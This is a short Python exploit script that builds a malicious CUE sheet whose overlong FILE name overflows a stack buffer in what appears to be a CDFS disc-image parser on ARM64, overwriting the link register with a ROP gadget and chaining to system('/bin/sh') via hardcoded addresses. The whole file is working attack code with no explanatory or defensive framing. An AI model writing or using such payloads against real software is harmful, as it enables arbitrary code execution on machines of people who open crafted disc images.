#!/usr/bin/env python3
import struct

offset = 4080  # correct LR offset

# gadgets we found
pop_x29_x30 = 0xfffff7e17f98
system_addr = 0xfffff7e3cec4
binsh_addr  = 0xfffff7f4c050

# Build ROP frame
frame  = struct.pack("<Q", 0x4141414141414141)  # fake x29
frame += struct.pack("<Q", system_addr)         # x30 → system()
frame += b"B"*8
frame += b"C"*8
frame += b"D"*8
frame += struct.pack("<Q", binsh_addr)          # goes to x0

# Build filename payload (ASCII until LR)
filename = b"A" * offset
filename += struct.pack("<Q", pop_x29_x30)   # overwrite LR
filename += frame                            # fake frame

# Escape all non-ASCII AFTER the overflow:
safe_filename = b""
for b in filename:
    if 32 <= b <= 126 and b not in (34,):     # printable, not quote
        safe_filename += bytes([b])
    else:
        safe_filename += b"\\x%02x" % b       # escapes

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "' + safe_filename + b'" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")
